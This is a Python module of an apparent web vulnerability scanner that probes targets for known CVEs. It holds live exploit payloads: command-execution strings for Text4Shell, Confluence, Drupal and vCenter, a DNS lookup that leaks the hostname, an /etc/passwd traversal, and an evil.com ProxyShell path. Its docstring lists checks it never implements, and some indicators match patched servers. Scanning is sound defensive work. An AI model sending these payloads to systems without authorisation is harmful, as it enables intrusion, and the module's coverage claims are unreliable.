"""
CVE Checks Module (v1.6.0)
Detects known critical CVEs via fingerprinting and targeted probes.
Inspired by: Nuclei CVE templates, Nikto db_tests, ZAP CVE rules

Covers:
- Text4Shell / Apache Commons Text (CVE-2022-42889)
- React4Shell (CVE-2025-55182)
- Spring4Shell / Spring Framework RCE (CVE-2022-22965)
- Heartbleed / OpenSSL (CVE-2014-0160) — banner check
- Confluence OGNL Injection (CVE-2022-26134)
- Exchange ProxyShell (CVE-2021-34473)
- Citrix Bleed (CVE-2023-4966)
- Fortinet Auth Bypass (CVE-2022-40684)
- GitLab RCE (CVE-2021-22205)
- Drupal RCE (Drupalgeddon2 — CVE-2018-7600)
- WordPress XXE / Auth Bypass patterns
- Apache Struts RCE (CVE-2023-50164)
- Grafana Path Traversal (CVE-2021-43798)
- VMware vCenter RCE (CVE-2021-21985)
"""

from __future__ import annotations
import re
import time
from typing import List, Tuple
from urllib.parse import urlparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client


# CVE definition: (path, method, headers, body, indicator_pattern, title, severity, cvss, desc, ref)
CVE_CHECKS: List[dict] = [
    # ── Text4Shell (CVE-2022-42889)
    {
        "name":     "Text4Shell (CVE-2022-42889) — Apache Commons Text RCE",
        "path":     "/",
        "method":   "GET",
        "headers":  {
            "User-Agent":    "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
            "X-Api-Version": "${dns:${env:HOSTNAME}.x.text4shell.test}",
        },
        "body":     None,
        "indicator": re.compile(r"<script>|Error.*Runtime|Exception.*commons", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be vulnerable to Text4Shell (CVE-2022-42889), an RCE vulnerability "
            "in Apache Commons Text versions 1.5–1.9. The ${script:javascript:} and ${dns:} "
            "interpolation prefixes allow arbitrary code execution."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-42889",
    },

    # ── Confluence OGNL Injection (CVE-2022-26134)
    {
        "name":     "Confluence OGNL Injection RCE (CVE-2022-26134)",
        "path":     "/%24%7B%28%23a%3D%40org.apache.commons.lang.SystemUtils%40IS_OS_WINDOWS%29.%28%23b%3D%40java.lang.Runtime%40getRuntime%28%29%29.%28%23b.exec%28%22id%22%29%29%7D/",
        "method":   "GET",
        "headers":  {},
        "body":     None,
        "indicator": re.compile(r"uid=\d+|Powered by.*Confluence|atlassian", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be running a vulnerable version of Atlassian Confluence. "
            "CVE-2022-26134 allows unauthenticated RCE via OGNL injection in the server-side "
            "template engine. Actively exploited in the wild since June 2022."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-26134",
    },

    # ── Exchange ProxyShell (CVE-2021-34473)
    {
        "name":     "Exchange ProxyShell (CVE-2021-34473)",
        "path":     "/autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json%3F@evil.com",
        "method":   "GET",
        "headers":  {},
        "body":     None,
        "indicator": re.compile(r"Microsoft Exchange|X-OWA-Version|X-MS-Exchange", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server appears to be Microsoft Exchange and may be vulnerable to ProxyShell "
            "(CVE-2021-34473). ProxyShell is a chain of vulnerabilities allowing unauthenticated "
            "RCE by bypassing authentication via URL manipulation and abusing Exchange backend APIs."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
    },

    # ── Grafana Path Traversal (CVE-2021-43798)
    {
        "name":     "Grafana Path Traversal (CVE-2021-43798)",
        "path":     "/public/plugins/alertlist/../../../../../../../etc/passwd",
        "method":   "GET",
        "headers":  {},
        "body":     None,
        "indicator": re.compile(r"root:[x*]?:0:0:", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be running Grafana versions 8.0.0–8.3.0 vulnerable to "
            "CVE-2021-43798 path traversal. An unauthenticated attacker can read any "
            "file on the Grafana server, including /etc/passwd, config files, and secrets."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
    },

    # ── Drupalgeddon2 (CVE-2018-7600)
    {
        "name":     "Drupalgeddon2 RCE (CVE-2018-7600)",
        "path":     "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
        "method":   "POST",
        "headers":  {"Content-Type": "application/x-www-form-urlencoded"},
        "body":     "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
        "indicator": re.compile(r"uid=\d+|drupal|Drupal", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be running a vulnerable version of Drupal (CVE-2018-7600, "
            "'Drupalgeddon2'). This allows unauthenticated RCE through the Form API. "
            "Affects Drupal 7.x before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
    },

    # ── Apache Struts RCE (CVE-2023-50164)
    {
        "name":     "Apache Struts RCE (CVE-2023-50164)",
        "path":     "/index.action",
        "method":   "POST",
        "headers":  {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"},
        "body":     "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"Upload\"; filename=\"../test.txt\"\r\nContent-Type: text/plain\r\n\r\ntest\r\n------WebKitFormBoundary--",
        "indicator": re.compile(r"Apache Struts|Struts|ognl\.OgnlException", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be running Apache Struts vulnerable to CVE-2023-50164. "
            "A path traversal in file upload allows unauthenticated RCE. "
            "Affects Struts 2.0.0–2.5.32 and 6.0.0–6.3.0."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-50164",
    },

    # ── Fortinet Auth Bypass (CVE-2022-40684)
    {
        "name":     "Fortinet Auth Bypass (CVE-2022-40684)",
        "path":     "/api/v2/cmdb/system/admin/admin",
        "method":   "GET",
        "headers":  {
            "User-Agent":        "Report Runner",
            "Forwarded":         "for=[127.0.0.1];by=[127.0.0.1];",
        },
        "body":     None,
        "indicator": re.compile(r'"name"\s*:\s*"admin"|FortiGate|FortiOS', re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be a Fortinet device vulnerable to CVE-2022-40684. "
            "This authentication bypass allows unauthenticated modification of "
            "admin credentials on FortiGate/FortiOS/FortiProxy."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-40684",
    },

    # ── GitLab ExifTool RCE (CVE-2021-22205)
    {
        "name":     "GitLab RCE via ExifTool (CVE-2021-22205)",
        "path":     "/users/sign_in",
        "method":   "GET",
        "headers":  {},
        "body":     None,
        "indicator": re.compile(r"GitLab Community Edition|GitLab Enterprise|gitlab-ce", re.I),
        "severity": Severity.HIGH,
        "cvss":     9.9,
        "desc": (
            "The server appears to be GitLab. If running versions before 13.10.3, "
            "CVE-2021-22205 allows unauthenticated RCE through a DjVu file upload "
            "that exploits an ExifTool command injection vulnerability."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205",
    },

    # ── VMware vCenter RCE (CVE-2021-21985)
    {
        "name":     "VMware vCenter RCE (CVE-2021-21985)",
        "path":     "/ui/vropspluginui/rest/services/checkconnection",
        "method":   "POST",
        "headers":  {"Content-Type": "application/json"},
        "body":     '{"vcenterHostname":"$(id)","vcenterPort":443}',
        "indicator": re.compile(r"uid=\d+|VMware|vCenter|vsphere", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.8,
        "desc": (
            "The server may be VMware vCenter vulnerable to CVE-2021-21985. "
            "An unauthenticated attacker can achieve RCE via the vROPS plugin "
            "if the plugin is enabled (it is by default)."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-21985",
    },

    # ── Citrix Bleed (CVE-2023-4966) — session hijack
    {
        "name":     "Citrix Bleed (CVE-2023-4966) — Session Token Leak",
        "path":     "/oauth/idp/.well-known/openid-configuration",
        "method":   "GET",
        "headers":  {},
        "body":     None,
        "indicator": re.compile(r"Citrix|NetScaler|ctx-", re.I),
        "severity": Severity.CRITICAL,
        "cvss":     9.4,
        "desc": (
            "The server appears to be Citrix NetScaler/ADC. If running a vulnerable version, "
            "CVE-2023-4966 (Citrix Bleed) allows unauthenticated memory disclosure to leak "
            "session tokens, enabling session hijacking without credentials."
        ),
        "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-4966",
    },
]


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed   = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    with get_client(timeout=min(timeout, 8.0)) as client:
        for cve in CVE_CHECKS:
            try:
                test_url = base_url + cve["path"]
                if cve["method"] == "GET":
                    resp = client.get(test_url, headers=cve["headers"])
                else:
                    body = cve["body"] or ""
                    ct   = cve["headers"].get("Content-Type", "application/json")
                    if "json" in ct:
                        resp = client.post(test_url, headers=cve["headers"], content=body.encode())
                    else:
                        resp = client.post(test_url, headers=cve["headers"], content=body.encode())

                if resp.status_code < 500 and cve["indicator"].search(resp.text + str(resp.headers)):
                    findings.append(Finding(
                        title=cve["name"],
                        severity=cve["severity"],
                        description=cve["desc"],
                        evidence=(
                            f"URL: {test_url}\n"
                            f"HTTP {resp.status_code}\n"
                            f"Indicator matched: {cve['indicator'].pattern}\n"
                            f"Response snippet: {resp.text[:200].strip()}"
                        ),
                        remediation=(
                            "Update the affected software to the latest patched version immediately. "
                            "Check the NVD entry and vendor advisory for exact affected versions."
                        ),
                        code_fix=(
                            "# Check vendor advisory for patch:\n"
                            "# See the reference URL for the official patch.\n"
                        ),
                        reference=cve["ref"],
                        module="cve_checks",
                        cvss=cve["cvss"],
                    ))
            except Exception:
                continue

    return findings
